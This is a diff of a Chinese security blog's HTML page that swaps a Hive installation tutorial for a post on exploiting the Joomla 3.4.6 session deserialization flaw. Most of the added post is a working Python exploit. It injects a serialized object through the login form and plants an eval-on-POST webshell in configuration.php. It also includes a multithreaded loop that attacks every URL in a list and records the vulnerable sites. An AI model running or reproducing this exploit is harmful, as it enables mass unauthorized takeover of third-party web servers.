@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="hadoop,hive,">
+  <meta name="keywords" content="反序列化,对象注入,代码执行,">
 
 
 
@@ -83,28 +83,21 @@
 
 
 
-<meta name="description" content="0x00 前言Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大数据，并使得查询和分析方便。并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。引自https://www.yiibai.com/hive/ 本次在安装hadoop基础上配置安装HIVE数据仓库。Hadoop安装教程参考Centos7搭建Hadoop伪分布">
-<meta name="keywords" content="hadoop,hive">
+<meta name="description" content="0x00 前言joomla!是一套全球知名的内容管理系统，在此之前，joomla曾爆出过严重的反序列化漏洞CVE-2015-8562,当时，在3.4.6之后的版本中被修复。 Joomla会话作为PHP对象存储在数据库中，并由PHP会话函数处理。这是一个有趣的攻击媒介，因为会话也为未经身份验证的用户存储，因此在那里的对象注入会导致未经身份验证的RCE。此次影响的版本为3.0.0-3.4.6 0x01">
+<meta name="keywords" content="反序列化,对象注入,代码执行">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Centos7配置安装HIVE">
-<meta property="og:url" content="https://zhengbao.wang/Centos7配置安装HIVE/index.html">
+<meta property="og:title" content="joomla3.4.6反序列化漏洞利用">
+<meta property="og:url" content="https://zhengbao.wang/joomla3-4-6反序列化漏洞利用/index.html">
 <meta property="og:site_name" content="Boogle&#39;s Blog">
-<meta property="og:description" content="0x00 前言Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大数据，并使得查询和分析方便。并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。引自https://www.yiibai.com/hive/ 本次在安装hadoop基础上配置安装HIVE数据仓库。Hadoop安装教程参考Centos7搭建Hadoop伪分布">
+<meta property="og:description" content="0x00 前言joomla!是一套全球知名的内容管理系统，在此之前，joomla曾爆出过严重的反序列化漏洞CVE-2015-8562,当时，在3.4.6之后的版本中被修复。 Joomla会话作为PHP对象存储在数据库中，并由PHP会话函数处理。这是一个有趣的攻击媒介，因为会话也为未经身份验证的用户存储，因此在那里的对象注入会导致未经身份验证的RCE。此次影响的版本为3.0.0-3.4.6 0x01">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.loli.net/2019/04/17/5cb681dc428fd.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/17/5cb682abe5216.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/17/5cb68361a0619.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/17/5cb68443d23f9.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/17/5cb68865ee29e.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/17/5cb6889618cb6.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/17/5cb6858693bc8.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/17/5cb6869fbfe64.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/17/5cb687a138126.png">
-<meta property="og:updated_time" content="2019-04-17T02:01:38.533Z">
+<meta property="og:image" content="https://i.loli.net/2019/10/09/9GsNPzMhqFYIvoW.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/09/YlZ7iCfRIGr5bND.png">
+<meta property="og:updated_time" content="2019-10-09T08:59:29.583Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Centos7配置安装HIVE">
-<meta name="twitter:description" content="0x00 前言Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大数据，并使得查询和分析方便。并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。引自https://www.yiibai.com/hive/ 本次在安装hadoop基础上配置安装HIVE数据仓库。Hadoop安装教程参考Centos7搭建Hadoop伪分布">
-<meta name="twitter:image" content="https://i.loli.net/2019/04/17/5cb681dc428fd.png">
+<meta name="twitter:title" content="joomla3.4.6反序列化漏洞利用">
+<meta name="twitter:description" content="0x00 前言joomla!是一套全球知名的内容管理系统，在此之前，joomla曾爆出过严重的反序列化漏洞CVE-2015-8562,当时，在3.4.6之后的版本中被修复。 Joomla会话作为PHP对象存储在数据库中，并由PHP会话函数处理。这是一个有趣的攻击媒介，因为会话也为未经身份验证的用户存储，因此在那里的对象注入会导致未经身份验证的RCE。此次影响的版本为3.0.0-3.4.6 0x01">
+<meta name="twitter:image" content="https://i.loli.net/2019/10/09/9GsNPzMhqFYIvoW.png">
 
 
 
@@ -134,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="https://zhengbao.wang/Centos7配置安装HIVE/">
+  <link rel="canonical" href="https://zhengbao.wang/joomla3-4-6反序列化漏洞利用/">
 
 
 
 
 
-  <title>Centos7配置安装HIVE | Boogle's Blog</title>
+  <title>joomla3.4.6反序列化漏洞利用 | Boogle's Blog</title>
   
 
 
@@ -312,7 +305,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://zhengbao.wang/Centos7配置安装HIVE/">
+    <link itemprop="mainEntityOfPage" href="https://zhengbao.wang/joomla3-4-6反序列化漏洞利用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="boogle">
@@ -329,7 +322,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Centos7配置安装HIVE</h1>
+          <h1 class="post-title" itemprop="name headline">joomla3.4.6反序列化漏洞利用</h1>
         
 
         <div class="post-meta">
@@ -341,8 +334,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-17T10:00:30+08:00">
-                2019-04-17
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-09T16:58:25+08:00">
+                2019-10-09
               </time>
             
 
@@ -364,8 +357,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/环境配置/" itemprop="url" rel="index">
-                    <span itemprop="name">环境配置</span>
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
                   </a>
                 </span>
 
@@ -382,8 +375,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/Centos7配置安装HIVE/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/Centos7配置安装HIVE/" itemprop="commentCount"></span>
+                <a href="/joomla3-4-6反序列化漏洞利用/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/joomla3-4-6反序列化漏洞利用/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -391,7 +384,7 @@
 
           
           
-             <span id="/Centos7配置安装HIVE/" class="leancloud_visitors" data-flag-title="Centos7配置安装HIVE">
+             <span id="/joomla3-4-6反序列化漏洞利用/" class="leancloud_visitors" data-flag-title="joomla3.4.6反序列化漏洞利用">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -416,7 +409,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  538 字
+                  935 字
                 </span>
               
 
@@ -432,7 +425,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  6 分钟
+                  15 分钟
                 </span>
               
             </div>
@@ -453,18 +446,19 @@
       
 
       
-        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大数据，并使得查询和分析方便。并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。引自<a href="https://www.yiibai.com/hive/" target="_blank" rel="noopener">https://www.yiibai.com/hive/</a></p>
-<p>本次在安装hadoop基础上配置安装HIVE数据仓库。Hadoop安装教程参考<a href="https://zhengbao.wang/Centos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/">Centos7搭建Hadoop伪分布式集群详细步骤</a></p>
-<h2 id="0x01-配置安装HIVE"><a href="#0x01-配置安装HIVE" class="headerlink" title="0x01 配置安装HIVE"></a>0x01 配置安装HIVE</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>首先<a href="http://www.apache.org/dyn/closer.cgi/hive/" target="_blank" rel="noopener">下载HIVE</a>,为了与Hadoop3.2.0,我选择的hive版本为3.1.1</p>
-<h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>下载完成后进行解压，根据解压目录自行配置环境变量<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="selector-class">.bashrc</span>   <span class="comment">//配置环境变量</span></span><br><span class="line">source <span class="selector-class">.bashrc</span>  <span class="comment">//使配置生效</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2019/04/17/5cb681dc428fd.png" alt></p>
-<h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>移动到HIVE安装目录下的<code>conf</code>文件夹执行<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cp hive-env<span class="selector-class">.sh</span><span class="selector-class">.template</span> hive-env<span class="selector-class">.sh</span> </span><br><span class="line"></span><br><span class="line">cp hive-default<span class="selector-class">.xml</span><span class="selector-class">.template</span> hive-site<span class="selector-class">.xml</span> </span><br><span class="line"></span><br><span class="line">cp hive-log4j2<span class="selector-class">.properties</span><span class="selector-class">.template</span> hive-log4j2<span class="selector-class">.properties</span> </span><br><span class="line"></span><br><span class="line">cp hive-exec-log4j2<span class="selector-class">.properties</span><span class="selector-class">.template</span> hive-exec-log4j2.properties</span><br></pre></td></tr></table></figure></p>
-<p>修改hive-env.sh,添加JAVA_HOME,HADOOP_HOME及HIVE配置文件目录，请根据自己环境自行修改如下<br><img src="https://i.loli.net/2019/04/17/5cb682abe5216.png" alt></p>
-<h3 id="Schema初始化"><a href="#Schema初始化" class="headerlink" title="Schema初始化"></a>Schema初始化</h3><p>执行<code>schematool -initSchema -dbType derby</code><br>执行成功效果如下<br><img src="https://i.loli.net/2019/04/17/5cb68361a0619.png" alt><br>如果执行failed，修改<code>hive-3.1.1/scripts/metastore/upgrade/derby</code>目录下的<code>hive-schema-2.1.0.derby.sql</code><br>按下图将框中内容使用注释符<code>--</code>注释<br><img src="https://i.loli.net/2019/04/17/5cb68443d23f9.png" alt><br>重新执行<code>schematool -initSchema -dbType derby</code></p>
-<h3 id="启动HIVE"><a href="#启动HIVE" class="headerlink" title="启动HIVE"></a>启动HIVE</h3><p>Schema初始化成功后即可启动hive，命令<code>hive</code><br>启动成功如下，如出现报错，请移至文末<code>0x03 问题解决</code>查看笔者记录部分问题解决方法<br><img src="https://i.loli.net/2019/04/17/5cb68865ee29e.png" alt></p>
-<h2 id="0x02-HIVE命令"><a href="#0x02-HIVE命令" class="headerlink" title="0x02 HIVE命令"></a>0x02 HIVE命令</h2><p><img src="https://i.loli.net/2019/04/17/5cb6889618cb6.png" alt><br>详细命令参考<a href="https://www.jianshu.com/p/b1fafc1bdb03" target="_blank" rel="noopener">Hive常用命令</a></p>
-<h2 id="0x03-问题解决"><a href="#0x03-问题解决" class="headerlink" title="0x03 问题解决"></a>0x03 问题解决</h2><h3 id="expansion-character问题"><a href="#expansion-character问题" class="headerlink" title="expansion character问题"></a>expansion character问题</h3><p><img src="https://i.loli.net/2019/04/17/5cb6858693bc8.png" alt><br>解决方法：修改报错的<code>hive-site.xml</code>,将报错位置<code>3210</code>行第96个字符删掉</p>
-<h3 id="system-xxx-路径错误问题"><a href="#system-xxx-路径错误问题" class="headerlink" title="${system:xxx}路径错误问题"></a>${system:xxx}路径错误问题</h3><p><img src="https://i.loli.net/2019/04/17/5cb6869fbfe64.png" alt><br>出现该问题的主要原因是hive配置文件中不能使用冒号目录定义方法，可将其直接修改为目录。<br>如配置文件中用<code>${system:java.io.tmpdir}</code>定义的路径改为<code>/tmp/</code>,<code>${system:user.name}</code>定义的路径改为<code>${user.name}</code>，其他类似<br>可使用<code>cat -n hive-site.xml |grep system:</code>定位到出现问题的位置<br><img src="https://i.loli.net/2019/04/17/5cb687a138126.png" alt></p>
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>joomla!是一套全球知名的内容管理系统，在此之前，joomla曾爆出过严重的反序列化漏洞<code>CVE-2015-8562</code>,当时，在<code>3.4.6</code>之后的版本中被修复。</p>
+<p>Joomla会话作为PHP对象存储在数据库中，并由PHP会话函数处理。这是一个有趣的攻击媒介，因为会话也为未经身份验证的用户存储，因此在那里的对象注入会导致未经身份验证的RCE。此次影响的版本为<code>3.0.0-3.4.6</code></p>
+<h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>10月7号，关于joomla 3.4.6的反序列化漏洞poc被公布。</p>
+<p>环境搭建，<code>joomla 3.4.6</code>下载地址<a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6" target="_blank" rel="noopener">https://downloads.joomla.org/it/cms/joomla3/3-4-6</a></p>
+<p>我在原有脚本的基础上修改了一点进行简单利用，原版可参见<a href="https://cn.0day.today/exploit/33327" target="_blank" rel="noopener">https://cn.0day.today/exploit/33327</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> colored</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">PROXS = &#123;<span class="string">'http'</span>:<span class="string">'127.0.0.1:8080'</span>&#125;</span><br><span class="line">PROXS = &#123;&#125;</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">'boogle'</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_info</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[*] "</span> + str,<span class="string">"cyan"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_ok</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[+] "</span>+ str,<span class="string">"green"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_error</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[-] "</span>+ str,<span class="string">"red"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_warning</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[!!] "</span> + str,<span class="string">"yellow"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(url, cook)</span>:</span></span><br><span class="line">        token = <span class="string">''</span></span><br><span class="line">        resp = requests.get(url, cookies=cook, proxies = PROXS)</span><br><span class="line">        html = BeautifulSoup(resp.text,<span class="string">'html.parser'</span>)</span><br><span class="line">        <span class="comment"># csrf token is the last input</span></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> html.find_all(<span class="string">'input'</span>):</span><br><span class="line">                csrf = v</span><br><span class="line">        csrf = csrf.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="keyword">return</span> csrf</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_error</span><span class="params">(url, cook)</span>:</span></span><br><span class="line">        resp = requests.get(url, cookies = cook, proxies = PROXS)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Failed to decode session object'</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                <span class="comment">#print(resp.text)</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment">#print(resp.text)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cook</span><span class="params">(url)</span>:</span></span><br><span class="line">        resp = requests.get(url, proxies=PROXS)</span><br><span class="line">        <span class="comment">#print(resp.cookies)</span></span><br><span class="line">        <span class="keyword">return</span> resp.cookies</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_req</span><span class="params">(url , object_payload)</span>:</span></span><br><span class="line">        <span class="comment"># just make a req with object</span></span><br><span class="line">        <span class="comment">#print_info('Getting Session Cookie ..')</span></span><br><span class="line">        cook = get_cook(url)</span><br><span class="line">        <span class="comment">#print_info('Getting CSRF Token ..')</span></span><br><span class="line">        csrf = get_token(url, cook)</span><br><span class="line"> </span><br><span class="line">        user_payload = <span class="string">'\\0\\0\\0'</span> * <span class="number">9</span></span><br><span class="line">        padding = <span class="string">'AAA'</span> <span class="comment"># It will land at this padding</span></span><br><span class="line">        working_test_obj = <span class="string">'s:1:"A":O:18:"PHPObjectInjection":1:&#123;s:6:"inject";s:10:"phpinfo();";&#125;'</span></span><br><span class="line">        clean_object = <span class="string">'A";s:5:"field";s:10:"AAAAABBBBB'</span> <span class="comment"># working good without bad effects</span></span><br><span class="line"> </span><br><span class="line">        inj_object = <span class="string">'";'</span></span><br><span class="line">        inj_object += object_payload</span><br><span class="line">        inj_object += <span class="string">'s:6:"return";s:102:'</span> <span class="comment"># end the object with the 'return' part</span></span><br><span class="line">        password_payload = padding + inj_object</span><br><span class="line"></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">'username'</span>: user_payload,</span><br><span class="line">            <span class="string">'password'</span>: password_payload,</span><br><span class="line">            <span class="string">'option'</span>:<span class="string">'com_users'</span>,</span><br><span class="line">            <span class="string">'task'</span>:<span class="string">'user.login'</span>,</span><br><span class="line">            csrf :<span class="string">'1'</span></span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#print_info('Sending request ..')</span></span><br><span class="line">        resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)</span><br><span class="line">        <span class="keyword">return</span> resp.text</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_backdoor_pay</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="comment"># This payload will backdoor the the configuration .PHP with an eval on POST request </span></span><br><span class="line">        function = <span class="string">'assert'</span></span><br><span class="line">        template = <span class="string">'s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:&#123;s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:&#123;&#125;s:21:"\\0\\0\\0disconnectHandlers";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"SimplePie":5:&#123;s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:&#123;&#125;s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";&#125;i:1;s:4:"init";&#125;&#125;s:13:"\\0\\0\\0connection";i:1;&#125;'</span></span><br><span class="line"></span><br><span class="line">        payload =  <span class="string">'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\''</span> + cmd +<span class="string">'\\\'])) eval($_POST[\\\''</span>+cmd+<span class="string">'\\\']);\', FILE_APPEND) || $a=\'http://xxx\';'</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        function_len = len(function)</span><br><span class="line">        final = template.replace(<span class="string">'PAYLOAD'</span>,payload).replace(<span class="string">'LENGTH'</span>, str(len(payload))).replace(<span class="string">'FUNC_NAME'</span>, function).replace(<span class="string">'FUNC_LEN'</span>, str(len(function)))</span><br><span class="line">        <span class="keyword">return</span> final</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_backdoor</span><span class="params">(url,param_name)</span>:</span></span><br><span class="line">        res = requests.post(url + <span class="string">'/configuration.php'</span>, data=&#123;param_name:<span class="string">'echo \'PWNED\';'</span>&#125;, proxies = PROXS)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'PWNED'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_backdoor</span><span class="params">(url, payload_code)</span>:</span></span><br><span class="line">        <span class="comment"># Execute PHP code from the backdoor</span></span><br><span class="line">        res = requests.post(url + <span class="string">'/configuration.php'</span>, data=&#123;cmd:payload_code&#125;, proxies = PROXS)</span><br><span class="line">        print(res.text)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(url)</span>:</span></span><br><span class="line"></span><br><span class="line">        target_url = url + <span class="string">'/index.php/component/users'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            make_req(target_url, get_backdoor_pay())</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print_warning(<span class="string">'exploit error,no index.php/component/users'</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> ping_backdoor(url, cmd):</span><br><span class="line">                    print_ok(<span class="string">'Backdoor implanted, eval your code at '</span> + url + <span class="string">'/configuration.php in a POST with '</span> + cmd)</span><br><span class="line">                    file_write(<span class="string">'joomla_vulu_site.txt'</span>,url+<span class="string">"\n"</span>)</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print_error(url +<span class="string">' is not vuluable'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print_warning(<span class="string">'ping_backdoor error'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bruter</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, urls,threads)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.vb_urls = Queue.Queue()</span><br><span class="line">        self.threads = threads</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> urls:</span><br><span class="line">            self.vb_urls.put(u[<span class="number">0</span>])</span><br><span class="line">        <span class="comment">#print self.vb_urls.get()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">vb5_rce</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> threading.Lock():</span><br><span class="line">            <span class="keyword">while</span> self.vb_urls.qsize() &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">                target = self.vb_urls.get()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">                    target = <span class="string">'http://'</span>+target</span><br><span class="line">                exploit(target)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span>  range(self.threads):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] thread '</span>+ str(i)</span><br><span class="line">            t = threading.Thread(target=self.vb5_rce)</span><br><span class="line">            t.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'joomla.txt'</span>,<span class="string">'r'</span>)  <span class="keyword">as</span> f:</span><br><span class="line">        r = json.loads(f.read())</span><br><span class="line">        urls = r[<span class="string">'results'</span>]</span><br><span class="line">        <span class="keyword">return</span> urls</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_write</span><span class="params">(name,results)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,mode=<span class="string">'a'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(results)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    urls = get_url()</span><br><span class="line">    vb5_rce = Bruter(urls=urls,threads=<span class="number">20</span>)</span><br><span class="line">    vb5_rce.run()</span><br></pre></td></tr></table></figure>
+<p>利用成功后将在配置文件<code>configuration.php</code>中写入一句话</p>
+<p><img src="https://i.loli.net/2019/10/09/9GsNPzMhqFYIvoW.png" alt></p>
+<p>然后便可以进一步的利用</p>
+<p><img src="https://i.loli.net/2019/10/09/YlZ7iCfRIGr5bND.png" alt></p>
+<p>至此简单利用成功，后面有时间的话，继续对漏洞产生原因出一篇分析文章。</p>
+<h2 id="0x02-参考链接"><a href="#0x02-参考链接" class="headerlink" title="0x02 参考链接"></a>0x02 参考链接</h2><p><a href="https://cn.0day.today/exploit/33327" target="_blank" rel="noopener">https://cn.0day.today/exploit/33327</a></p>
+<p><a href="https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41" target="_blank" rel="noopener">https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41</a></p>
 
       
     </div>
@@ -481,12 +475,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/Centos7配置安装HIVE/">Centos7配置安装HIVE</a></p>
